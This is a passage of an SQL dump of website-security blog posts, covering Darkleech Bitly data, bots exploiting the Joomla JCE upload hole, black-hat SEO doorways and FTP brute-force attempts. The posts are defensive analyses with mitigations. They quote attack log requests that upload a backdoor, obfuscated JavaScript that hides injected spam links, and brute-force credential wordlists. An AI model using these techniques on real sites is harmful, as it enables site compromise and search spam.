'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (115, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (116, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a .gof and then change it’s extension to .php.If you don’t have Joomla, then you might see multiple attempts to scan your site for that JCE security hole. They do it on every site. If they find it – they exploit it, if not they move on to the next site. So what you are seeing is probably just attack attempts, not successful attacks. On the other hand, if hackers find vulnerabilities in vBulletin or any other type of site, they’ll most likely upload pretty much the same backdoors as if it was Joomla.vBulletin may be slightly different as most of it’s malware lives in its database.                   			        			JCE Joomla Extension Attacks in the Wild | Sucuri Blog | 26 Mar 2014 8:11 pm 						[…] Unmask: Invasion of JCE Bots […]                   			        			catalina | 30 Mar 2014 6:23 am 						If I understood, I have to open my .htaccess file and insert these lines:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shThats it?Which are the “collateral effects” of this?Thanks in advanceCatalina                   			        			Denis | 11 Jun 2014 5:16 pm 						This code makes web server treat such files as regular text files. I.e. instead of executing any code in them, it will just display their content in a browser as if they were plain text files.The side effect is you won’t be able to have executable scripts in those directories. But it’s the point of this trick – place it to the directories that shouldn’t have executable files', '', 'http://blog.unmaskparasites.com/2014/01/27/invasion-of-jce-bots/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (117, 'Reporting Suspicious Styles', 'unmask', '22 Nov 13', 'Loading site search ...          			                Reporting Suspicious Styles                          22 Nov 13   Filed in Unmask Parasites                Back in 2008, the very first task that I created Unmask Parasites for was scanning web pages for hidden links.I read an article about thousands of WordPress blogs being stuffed with dozens of invisible spammy links. I had a self-hosted WordPress blog too and that article made me think if there was some easy way to figure out whether my blog was hacked, something less laborious than manually examining the HTML code link by link. So I decided to create a tool that would show all domains that my web pages linked to highlighting those of them that had “invisible” styles. This approach has proved to be very efficient in identifying black hat SEO hacks. In most cases, a glance is enough to spot such problems.It works well even when the tool doesn’t highlight links as “hidden” (either because the “hiding rule” was not detected or because it scanned the “cloaked” page created specifically for search engines). You can still see the links that clearly don’t belong to your site, which tells you that something’s wrong.However, looking for suspicious links is not the bullet-proof method for detecting spam injection issues. For example, in my yesterday’s post on Sucuri blog, I wrote about fake WordPress plugins that used to injects spammy links and a JavaScript code into web pages. However, at the moment, they inject some hidden spammy auto-generated text that doesn’t have any links.You can use this Google query to reveal affected sites [cigarettes AND (“3200 unhealthy” OR “3300 hazardous”)]I don’t know why they do it, but webmasters should definitely be warned about such injections because it’s a sign of a problem that should be fixed as soon as possible. This is actually more serious than just a factor that can potentially affect site’s search ranking. Those fake plugins fetch the spammy content from remote servers and inject it into blog pages on the fly. This means that hackers can change it any time and the same moment the new spammy block will be injected into all compromised sites. Or it can be a malicious block, which makes things more serious as it will affect all visitors to those sites too.Unfortunately, such injections were not reported by Unmask Parasites since there were no links in the spammy block. After thinking about the problem, I decided that Unmask Parasites should also report pure HTML tricks such as that clip:rect style trick that hackers use to hide their injections.So , starting this week, you may see the “Suspicious Styles” section in Unmask Parasites reports.In this section, you will see excerpts of the style definitions that Unmask Parasites considers suspicious. If you see it in your site reports, then you should check the HTML code of your pages and figure out whether that style is a normal part of your pages or it was added there to hide something illicit.Note, if you can’t find such code in your web pages, it doesn’t mean it is not there. The code injection can be conditional, and server files may fetch it from a remote location (as in this case with fake WordPress plugins), or it can be encrypted. Just remember that Unmask Parasites works in real time (some results may be cached for up to an hour) and if it reports something, then you can be sure it was on a web page at the moment of scanning.To Unmask Parasites usersIf you like Unmask Parasites and want to help improve it, you can inform me about interesting tricks that hackers use to hide injected content Or send me examples of infected web pages where Unmask Parasites doesn’t report any problems.Thanks!Related posts:Unmasking “Canonical” HacksRich Snippets in Black Hat SEOIntroduction to Website Parasites                                                                                  Tags: black hat seo hidden links spam                                                    			                                            « Unmask Parasites joins Sucuri                Invasion of JCE Bots »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/11/22/reporting-suspicious-styles-2/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (118, 'Unmask Parasites joins Sucuri', 'unmask', '20 Sep 13', 'Loading site search ...          			                Unmask Parasites joins Sucuri                          20 Sep 13   Filed in Unmask Parasites                It’s official. This week Unmask Parasites joins Sucuri!Since July of 2008 when I released the first public version, Unmask Parasites was a “one man project” and it worked fine for me most of the time. I did everything myself from server setup to site development, from web attack investigations to blogging here. During these years Unmask Parasites became quite noticeable both within webmasters and Internet security community. And I always tried to meet their expectations providing a tool that could reveal various obscure website security issues and sharing information on how and why websites get hacked, and what can be done to prevent it.When Sucuri approached me and asked if I wanted to join their team as a malware researcher, I didn’t think much. I’ve been watching this company since 2010 and knew how much we had in common in our approach to Internet security. We both focus on helping site owners to detect security problems and protect their sites. We do our best to educate webmasters about things that hackers do with compromised websites — unmasking their dirty tricks is an important part of our work. In 2011 we established good relationship and began to help each other by sharing our information about ongoing massive attacks. Now Sucuri has grown to one of the leading companies in its field and makes a significant impact on how many thousands of site owners protect their sites. It’s an honor for me to join this company and the team of professionals that I know for so long time.I guess you wonder what will happen to Unmask Parasites scanner and this blog? They are here to stay! I will still be responsible for Unmask Parasites and continue to improve it and publish my blogposts here. Even better: now that I’m with Sucuri, I will have access to large volumes of data from their tools and support team (something that I really missed during the last five years), which will definitely facilitate my investigations, and, in turn, improve the quality of Unmask Parasites scanner and Sucuri own tools.For additional information check the Sucuri’s announcement.Let’s unmask parasites!Related posts:Let’s Unmask Parasites1 Million Pages Checked by Unmask Parasites!Unmask Parasites. A Year of Blogging.                                                                                  Tags: Sucuri                                                    			                                            « Analyzing [Buy Cialis] Search Results                Reporting Suspicious Styles »            			    Reader\'s Comments (2)       	        			        			Jackie McBride | 21 Sep 2013 3:36 pm 						Denis, I cannot think of anyone more deserving than you of this opportunity. Hearty congratulations & many blessings in your new venture as you go forward! & Sucuri better realize how damn lucky they are lol. From the sound of the announcement, it appears they do. Again, congratulations!                   			        			Sucuri Expands Research Efforts with Acquisition of Unmask Parasites | Sucuri Blog | 15 Sep 2014 11:50 pm 						[…] Unmask Parasites blog post […]', '', 'http://blog.unmaskparasites.com/2013/09/20/unmask-parasites-joins-sucuri/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (119, 'Analyzing [Buy Cialis] Search Results', 'unmask', '21 Aug 13', 'Loading site search ...          			                Analyzing [Buy Cialis] Search Results                          21 Aug 13   Filed in General                A few days ago I was updating the spammy word highlighting functionality  in Unmask Parasites results and needed to test the changes on real websites. To find hacked websites with spammy content I would normally google for [viagra] or [cialis], which are arguably the most targeted keywords used in black hat SEO hacks. However after the Google’s June update in how they rank web pages for spammy queries, I didn’t have much expectation of seeing hacked sites on the first page of search results for my usual [buy cialis] query and was ready to check a few more pages.We just started a new ranking update today for some spammy queries. See 2:30-3:10 of this video: http://t.co/KOMozoc3lo #smx— Matt Cutts (@mattcutts) June 11, 2013Indeed, for queries like [payday loans] I can see quite relevant results on the first three pages. All sites are specialized and don’t look like doorways on hacked sites. That’s really good. For [viagra] I found only one result on the first page pointing to a doorway on a hacked site. Still good.However, when I entered a really spammy combination [buy viagra], the search results were less than optimal — 5 out of 10 led to hacked sites. And at least 2 out of the rest 5 specialized sites were promoted using hidden links on hacked sites. Not good. And the worst results (although ideal for testing my update) were for the [buy cialis] query — 100% of results on the first page (10 out of 10) led to doorways on hacked sites or simply spammy web pages. Not a single result from websites that really have anything to do with cialis.Results analysisHere is the breakdown of the first 10 results (links go to real time Unmask Parasites reports for these pages and at the moment of writing they all reveal spammy content. However this may change over time):www.epmonthly .com/advertise/ — doorway on a hacked sitewerenotsorry .com/ — strange spammy site with a rubbish content like this “The car buy cialis in your car is the ultimate well source of electrical amazing power in your car.“incose .org/dom/ — doorway on a hacked site.www.deercrash .org/buy/cialis/online/ — doorway on a hacked sitejon-odell .com/?p=54 — doorway on a hacked sitewww.goodgrief .org .au/Cialis/ — doorway on a hacked sitewww.asm .wisc .edu/buy-cialis — doorway on a hacked sitewww.mhfa .com .au/cms/finance-home/ — doorway on a hacked sitewww .plowtoplate .org/library/51.html — doorway on a hacked sitejohn-leung .com/?p=16 — doorway on a hacked siteOver the course of the past week the results slightly fluctuated and sometimes I saw the following links on the first SERP.www.enconline .com/buycialisonline/ — doorway on a hacked sitewww.bbs-usa .com/online/ — doorway on a hacked sitewww.fabrand .com/buycialis/ — doorway on a hacked sitewww.philiptusa .com/streak/ — doorway on a hacked sitewww.clarkart.edu/authman/ — doorway on a hacked sitewww.gvhc.org/temp/index.html — doorway on a hacked sitewww.cialis-no-prescriptions.com — specialized site, but its backlink profile include many hacked sites with injected hidden links (e.g. www.aauw-nys.org)tadalafilcheap .ca/buy-cialis-online – another specialized site with a very poor backlink profile (mostly spammy off-topic forum posts).Out of 18 links that I encountered on the first page for [buy cialis] 15 point to doorways on hacked sites, 1 to a site with unreadable machine-generated text (still not sure whether it’s some SEO experiment or a backdoor with a tricky search traffic processing procedure) and 2 specialized sites relevant to the query but with quite bad backlink profiles. Overall 0% of results that follow Google’s quality guidelines.So the Google’s update for spammy queries doesn’t seem to work as it should at least for some über spammy queries.  It’s sad. And the reason why I’m sad is not that I worry about people who use such queries on Google to buy some counterfeit drugs.  My major concern is this situation justifies the huge number of sites (many thousands) that cyber-criminals hack in order to put a few of their doorways to the top for relevant queries on Google.Behind the scenesThe above 15 hacked sites that I found on the first Google’s SERP are actually only a tip of the iceberg. Each of them is being linked to from many thousands (if not millions) pages from similarly hacked sites. Here you can see a sample list of  sites that link to the above 15 (you might need a specialized tool like Unmask Parasites to see hidden and cloaked links there).Many of the hacked web pages link to more than one doorway page, which maximizes changes that one of them will be finally chosen by Google to be displayed on the first page for one of the many targeted keywords. And at the same time this helps to have a pool of alternative doorways in case some of them will be removed by webmasters or penalized by Google. As a result, the networks of doorways, landing pages and link pages can be very massive. Here you can see a list with just a small part of spammy links (338 unique domains) that can be found  on hacked web pages..gov, .edu and .orgAmong those hacked sites you can find sites of many reputable organizations, which most likely greatly help to rank well on Google. There are many compromised sites of professional associations, universities and even governmental sites, for example (as of August 19th, 2013):www.volunteer.gov/sec/spb.ca.gov/status/www.takepride.gov/index.htmlVolume of spammy backlinksIf you take some of the top results and check their backlink profiles (I used Majestic SEO Site Explorer), you’ll see how many domains can be compromised (or spammed) just in one black hat SEO campaign. And we know that there are many ongoing competing campaigns just for “cialis” search traffic, so you can imaging the overall impact.On the above screenshot you can see that thousands of domains linking to “www .epmonthly .com/advertise/” using various “cialis” keywords.The situation with “www. epmonthly .com/advertise/” is quite interesting. If you google for [“www.epmonthly .com/advertise/”] you’ll see more than a million results pointing to web pages where spammers used automated tools to post spammy links (including this one) in comments, profiles , etc. but failed to verify whether those sites accept the HTML code they were posting (still many sites, while escaping the HTML code, automatically make all URLs clickable, so those spammers finally achive their goal) .Typical black hat SEO tricksIn addition to annoying but pretty harmless comment spamming, forum spamming and creating fake user profiles, black hats massively hack websites with established reputation and turn them into their SEO assets.Spammy linksThe most common use for a hacked site is injecting links pointing to promoted resources (it can be a final landing page, or a doorway, or an intermediary site with links). Here is what such web pages may look like in Unmask Parasites reports:To hide such links from site owners, hackers make them hidden. For example, they can place them in an off-screen <div><div style=\"position:absolute; left:-8745px;\">...spammy links here...</div>Or put them in a normal <div> and add a JavaScript to make this <div> invisible when a browser loads the page<div id=\'hideMe\'> ... spammy links here.... </div><script type=\'text/javascript\'>if(document.getElementById(\'hideMe\') != null){document.getElementById(\'hideMe\').style.visibility = \'hidden\';document.getElementById(\'hideMe\').style.display = \'none\';}</script>The JavaScript can be encrypted.e v a l(function(p,a,c,k,e,d){e=function(c){return(c<a?\"\":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!\'\'.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return\'\\\\w+\'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);return p;}(\'2.1(\\\'0\\\').5.4=\"3\";\',6,6,\'bestlinks|getElementById|document|none|display|style\'.split(\'|\'),0,{}))which translates todocument.getElementById(\'bestlinks\').style.display=\"none\";where “bestlinks” is the id of the <div> with spammy links.Sometimes, encrypted JavaScript can be coupled with dynamic HTML generation of the link container. After decryption it looks like this:document.w ri t e(\'<style><!-- .read {display:none} --></style><address class=\"read\">\');...spammy links here...document.wri te(\'</address>\');Of course, it’s only a client-side representation of the problem. On the server side, it’s rarely this straightforward. Most times it involves obfuscated (usually PHP) code in sneaky places (e.g. themes, plugins, DB, etc.)DoorwaysSites that rely on black hat SEO techniques get penalized by Google soon enough so the can’t expect much search traffic directly from search engines. Instead they try to promote many disposable doorways on other reputable sites that would redirect search traffic to them.The typical approach is to hack a website and use cloaking tricks (generating a specialized version with spammy keywords specifically for search engines while leaving the original content for normal visitors) to make search engines think that its pages are relevant for those spammy queries. E.g. check the title of the “www.epmonthly .com/advertise/” when you visit it in a browser (“Advertise“) and when you check it in Unmask Parasites or in Google’s Cache (“Buy Cialis (Tadalafil) Online – OVERNIGHT Shipping“). Then they add some functionality to distinguish visitors coming from search engines and redirect them to third party sites that pay hackers for such traffic.The redirects may be implemented as .htaccess rules, client-side JavaScript code, or server-side PHP code.Sometimes, instead of using cloaking, hackers simply create a whole spammy section in a subdirectory of a legitimate site, or a standalone doorway page. Example from our cialis search results: www .asm .wisc .edu/buy-cialis .To WebmastersIt might be tricky to determine whether your site fell victim to a black hat SEO hack since hackers do their best to hide evidence from site owners and regular visitors. At the same time antivirus tools won’t help you here since links and redirects (in case they can actually see them) are not considered harmful. Nonetheless, a thoughtful webmaster is always equipped with proper tools and tricks (click here for details) to determine such issues.  They range from specialized Google search queries and and reports in Webmaster Tools to log analysis and server-side integrity control.In addition to the tricks that I described here, you can try to simply load your site with JavaScript turned off. Sometimes this is all it takes to find hidden links whose visibility is controlled by a script.Fighting black hat SEO hacksOf course, site owners are responsible for what happens with their sites, should protect them and clean them up in case of hacks. Doorways on hacked sites would never appear in search results if all webmasters would quickly mitigate such issues.But let’s take a look at this from a different perspective. The main goal of all black hat SEO hacks is to put their doorways to the top on Google for relevant keywords and get a targeted search traffic. And 80% (or even more) massive campaigns target a very narrow set of keywords and their modification. If Google actively monitor the first pages of search results for such keywords and penalize doorways, this could significantly reduce efficacy of such campaigns leaving very few incentive to hack website to put spammy links there. And you don’t have to monitor every possible keyword combination. In my experience, most of them will finally point to the same doorways.I can see Google moving in this direction. The description of the above mentioned ranking algorithm update is very promising. However, as the [buy cialis] query with 0% of relevant search results on the first page shows — a lot should be improved.P.S  Just before posting this article, I checked results for [buy cialis] once more and … surprise!.. found a link to a Wikipedia article about Tadalafil at the 4th position. Wow! Now we have 1 result that doesn’t seem to have anything to do with hacked sites.Related postsCloaking: Think Outside of [Your] BoxCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesMatt Cutts on MalwareIntroduction to Website Parasites                                                                                  Tags: black hat seo cialis cloaking doorway google hidden links spam                                                    			                                            « FTP Brute Force Attacks?                Unmask Parasites joins Sucuri »            			    Reader\'s Comments (2)       	        			        			Colin | 29 Aug 2013 9:27 am 						Hi Dennis,Great analysis, very intersting.I actually contacted the support team at Volunteer.gov a couple of weeks ago, and they were able to remove the hacked pages they were hosted, as well as the other .govs. Great result, was happy at that :)They were hosting a pharma online store, which on investigation was apparently set up to facilitate credit card fraud.Cheers                   			        			Denis | 29 Aug 2013 4:28 pm 						Good!-1 spammy doorway on .gov.Hope Google will also take care of what it returns for certain spammy queries.', '', 'http://blog.unmaskparasites.com/2013/08/21/analyzing-buy-cialis-search-results/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (120, 'FTP Brute Force Attacks?', 'unmask', '26 Jun 13', 'Loading site search ...          			                FTP Brute Force Attacks?                          26 Jun 13   Filed in Website exploits                Hacking websites using FTP access has been one of the most popular attack vectors during the last few year. I can still see many massive site infections done via FTP.In most cases, the first step of such attacks is stealing FTP credentials from local computers of webmasters. Back in 2009, I described how PC malware stole passwords saved in popular FTP clients such as FileZilla, CuteFTP, SmartFTP and many more. This is still a prevailing vector. More exotic password theft methods include keyloggers, FTP traffic sniffing, and stealing user databases of hosting providers who prefer convenience over security and store actual client passwords in plain text or slightly encrypted (instead of storing only hashes of passwords).If you ask regular webmasters how hackers can break into their server via FTP, many of them will answer that hackers could guess the password (hence the need to have hard-to-guess passwords).  Of course, it is hard to guess whatever password at the first attempt, so one might expect to see multiple such attempts (so-called brute force attacks) before a password is cracked and hackers get access to a server. However in real life, I haven’t come across such FTP brute force attacks. Until this month…FTP log analysisI helped a webmaster of a hacked site and, as always, requested recent access and FTP logs to figure out how the site was hacked. The FTP logs clearly showed that someone used a valid username and passwords to upload infected files to the server. This happened several times a day (constant reinfections) from different IPs in different countries. Quite a typical picture.What was untypical were requests that looked like a brute force attack. They came from different IPs and each IP tried to login using many invalid usernames.Choice of usernames in brute force attacks.Here are just a few such sessions and the usernames they tried.198.50.144.128 (Canada		        Montreal		        Ovh Hosting Inc) – 165 login attempts within 70 seconds.second_level_domainsecond_level_domawebmasterwhere <second_level_domain> should be replaced with a real second level domain of a site. E.g. in case of “example.com” the second_level_domain will be example.This attack used the <domain name> as a username and webmaster as an alternative (supposedly default) username, and tried multiple popular passwords from some dictionary.46.29.255.84 (United States		        Lombard		        Deepak Mehta Fie) 	– 9 login attempts at a rate of 2 a second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their 